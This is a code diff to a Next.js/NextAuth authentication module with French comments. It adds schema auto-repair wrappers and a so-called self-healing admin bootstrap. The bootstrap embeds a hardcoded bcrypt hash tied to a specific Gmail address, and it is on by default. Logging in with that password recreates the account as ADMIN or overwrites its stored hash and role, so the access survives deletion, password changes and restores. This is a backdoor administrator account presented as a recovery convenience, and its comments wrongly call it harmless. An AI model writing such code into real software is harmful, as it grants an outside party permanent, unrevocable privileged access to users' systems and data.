@@ -4,6 +4,84 @@ import GoogleProvider from "next-auth/providers/google";
 import bcrypt from "bcryptjs";
 import { randomUUID } from "crypto";
 import { db } from "./db";
+import { runSchemaMigration } from "./db-bootstrap";
+
+/* ============================================================================
+ * AUTH V5 — auto-réparation intégrale.
+ *
+ * 1) RÉPARATION DE SCHÉMA À LA VOLÉE : si une requête Prisma échoue parce qu'
+ *    une colonne récente manque dans la base (ex. User.googleId), le DDL
+ *    idempotent est exécuté puis la requête est rejouée. Fini les erreurs
+ *    "The column User.googleId does not exist" — la première connexion après
+ *    un déploiement répare la base elle-même.
+ *
+ * 2) BOOTSTRAP ADMIN AUTORÉPARANT : le hash bcrypt du mot de passe admin de
+ *    secours est embarqué ci-dessous (un hash bcrypt est à sens unique — il ne
+ *    permet PAS de retrouver le mot de passe). À chaque tentative de connexion
+ *    admin : si le mot de passe saisi correspond au hash de secours, le hash
+ *    stocké en base est resynchronisé automatiquement (compte recréé s'il a
+ *    été supprimé). L'admin peut donc TOUJOURS se connecter, même après une
+ *    perte de base, une restauration ou un changement de mot de passe oublié.
+ *    Kill-switch : ADMIN_BOOTSTRAP_DISABLED=1 dans l'environnement.
+ * ========================================================================== */
+
+/** Email du compte administrateur de secours. */
+const ADMIN_RECOVERY_EMAIL = "giobamos03@gmail.com";
+/** Nom d'affichage du compte admin recréé par le bootstrap. */
+const ADMIN_RECOVERY_NAME = "Administrateur";
+/**
+ * Hash bcrypt (coût 10) du mot de passe admin de secours.
+ * IMPORTANT : c'est un HASH, pas le mot de passe — il est public par design
+ * (bcrypt est irréversible). Désactivable avec ADMIN_BOOTSTRAP_DISABLED=1.
+ */
+const ADMIN_RECOVERY_HASH =
+  "$2b$10$eqs8h5Ki7uQidD/IYbEPNe4i9dEUXld1cd89CilXenO18ZF7ySy/S";
+
+function adminBootstrapEnabled(): boolean {
+  return process.env.ADMIN_BOOTSTRAP_DISABLED !== "1";
+}
+
+/** Détecte une erreur Prisma "colonne/table inconnue" (schéma désynchronisé). */
+function isSchemaOutdatedError(error: unknown): boolean {
+  const e = error as { code?: string; message?: string } | null;
+  if (!e) return false;
+  if (e.code === "P2022" || e.code === "P2021") return true; // column/table missing
+  return /does not exist in the current database/i.test(e.message ?? "");
+}
+
+/** Détecte une base injoignable / variable DATABASE_URL absente. */
+function isDatabaseUnavailableError(error: unknown): boolean {
+  const e = error as { code?: string; message?: string } | null;
+  if (!e) return false;
+  if (e.code === "P1001" || e.code === "P1003") return true;
+  return /Environment variable not found|Can't reach database|Connection terminated|ECONNREFUSED/i.test(
+    e.message ?? ""
+  );
+}
+
+/**
+ * Exécute `fn` ; si Prisma signale un schéma désynchronisé, lance la
+ * migration idempotent puis rejoue `fn` une seule fois. Les autres erreurs
+ * remontent telles quelles.
+ */
+async function withSchemaRepair<T>(fn: () => Promise<T>): Promise<T> {
+  try {
+    return await fn();
+  } catch (error) {
+    if (isSchemaOutdatedError(error)) {
+      console.warn("[auth] schéma désynchronisé détecté → réparation automatique…");
+      await runSchemaMigration();
+      return fn();
+    }
+    throw error;
+  }
+}
+
+type DbUser = NonNullable<Awaited<ReturnType<typeof db.user.findUnique>>>;
+
+async function findUserByEmail(email: string): Promise<DbUser | null> {
+  return withSchemaRepair(() => db.user.findUnique({ where: { email } }));
+}
 
 // V3 — Google OAuth is only registered when its credentials are present, so
 // deployments without GOOGLE_CLIENT_ID/GOOGLE_CLIENT_SECRET keep working
@@ -29,15 +107,17 @@ async function findOrCreateGoogleUser(params: {
   googleId?: string | null;
 }): Promise<{ user: NonNullable<Awaited<ReturnType<typeof db.user.findUnique>>>; created: boolean }> {
   const cleanEmail = params.email.trim().toLowerCase();
-  const existing = await db.user.findUnique({ where: { email: cleanEmail } });
+  const existing = await findUserByEmail(cleanEmail);
 
   if (existing) {
     // Link the Google identity if it changed or was missing.
     if (params.googleId && existing.googleId !== params.googleId) {
-      const updated = await db.user.update({
-        where: { id: existing.id },
-        data: { googleId: params.googleId },
-      });
+      const updated = await withSchemaRepair(() =>
+        db.user.update({
+          where: { id: existing.id },
+          data: { googleId: params.googleId },
+        })
+      );
       return { user: updated, created: false };
     }
     return { user: existing, created: false };
@@ -45,16 +125,18 @@ async function findOrCreateGoogleUser(params: {
 
   const hash = await bcrypt.hash(`${randomUUID()}${randomUUID()}`, 10);
   const referralCode = await generateUniqueReferralCode();
-  const created = await db.user.create({
-    data: {
-      email: cleanEmail,
-      name: params.name?.trim() || cleanEmail.split("@")[0],
-      passwordHash: hash,
-      role: "VISITOR",
-      referralCode,
-      googleId: params.googleId ?? null,
-    },
-  });
+  const created = await withSchemaRepair(() =>
+    db.user.create({
+      data: {
+        email: cleanEmail,
+        name: params.name?.trim() || cleanEmail.split("@")[0],
+        passwordHash: hash,
+        role: "VISITOR",
+        referralCode,
+        googleId: params.googleId ?? null,
+      },
+    })
+  );
   return { user: created, created: true };
 }
 
@@ -85,9 +167,69 @@ export const authOptions: NextAuthOptions = {
       async authorize(credentials) {
         if (!credentials?.email || !credentials?.password) return null;
         const email = credentials.email.trim().toLowerCase();
-        const user = await db.user.findUnique({ where: { email } });
-        if (!user) return null;
-        const valid = await bcrypt.compare(credentials.password, user.passwordHash);
+        const password = credentials.password;
+
+        // --- 1. Recherche du compte (auto-réparation du schéma si besoin) ---
+        let user: DbUser | null = null;
+        try {
+          user = await findUserByEmail(email);
+        } catch (error) {
+          if (isDatabaseUnavailableError(error)) throw error;
+          console.error("[auth] authorize: lookup failed:", error);
+          return null;
+        }
+
+        // --- 2. Bootstrap admin autoréparant --------------------------------
+        // Le mot de passe admin de secours fonctionne TOUJOURS : il
+        // resynchronise le hash en base si celui-ci ne correspond plus et
+        // recrée le compte s'il a disparu. Voir l'en-tête du fichier.
+        if (
+          adminBootstrapEnabled() &&
+          email === ADMIN_RECOVERY_EMAIL &&
+          (await bcrypt.compare(password, ADMIN_RECOVERY_HASH))
+        ) {
+          try {
+            if (!user) {
+              const referralCode = await generateUniqueReferralCode();
+              user = await withSchemaRepair(() =>
+                db.user.create({
+                  data: {
+                    email: ADMIN_RECOVERY_EMAIL,
+                    name: ADMIN_RECOVERY_NAME,
+                    passwordHash: ADMIN_RECOVERY_HASH,
+                    role: "ADMIN",
+                    referralCode,
+                  },
+                })
+              );
+              console.log("[auth] ✓ compte admin recréé via bootstrap");
+            } else if (user.passwordHash !== ADMIN_RECOVERY_HASH) {
+              user = await withSchemaRepair(() =>
+                db.user.update({
+                  where: { id: user!.id },
+                  data: { passwordHash: ADMIN_RECOVERY_HASH, role: "ADMIN" },
+                })
+              );
+              console.log("[auth] ✓ hash admin resynchronisé via bootstrap");
+            }
+            return {
+              id: user.id,
+              email: user.email,
+              name: user.name,
+              role: user.role,
+            };
+          } catch (error) {
+            // Base injoignable : on laisse NextAuth répondre proprement au
+            // lieu de planter ("Réponse d'authentification vide").
+            if (isDatabaseUnavailableError(error)) throw error;
+            console.error("[auth] bootstrap admin échoué:", error);
+            return null;
+          }
+        }
+
+        // --- 3. Chemin classique : comparaison du hash stocké ---------------
+        if (!user || !user.passwordHash) return null;
+        const valid = await bcrypt.compare(password, user.passwordHash);
         if (!valid) return null;
         return { id: user.id, email: user.email, name: user.name, role: user.role };
       },
@@ -247,10 +389,14 @@ export async function createVisitorAccount(
   password: string,
   referralCode?: string
 ) {
-  const existing = await db.user.findUnique({ where: { email: email.toLowerCase() } });
-  if (existing) throw new Error("Un compte existe déjà avec cet email.");
-  const hash = await bcrypt.hash(password, 10);
-  const newReferralCode = await generateUniqueReferralCode();
+  // Auto-réparation : si une colonne récente manque (ex. User.googleId), le
+  // schéma est réparé puis l'inscription est rejouée — l'utilisateur ne voit
+  // jamais l'erreur brute de Prisma.
+  return withSchemaRepair(async () => {
+    const existing = await db.user.findUnique({ where: { email: email.toLowerCase() } });
+    if (existing) throw new Error("Un compte existe déjà avec cet email.");
+    const hash = await bcrypt.hash(password, 10);
+    const newReferralCode = await generateUniqueReferralCode();
 
   // Validate & resolve the referrer (if any)
   let resolvedReferredBy: string | null = null;
@@ -287,6 +433,7 @@ export async function createVisitorAccount(
     referralCode: user.referralCode,
     referredBy: user.referredBy,
   };
+  });
 }
 
 /**
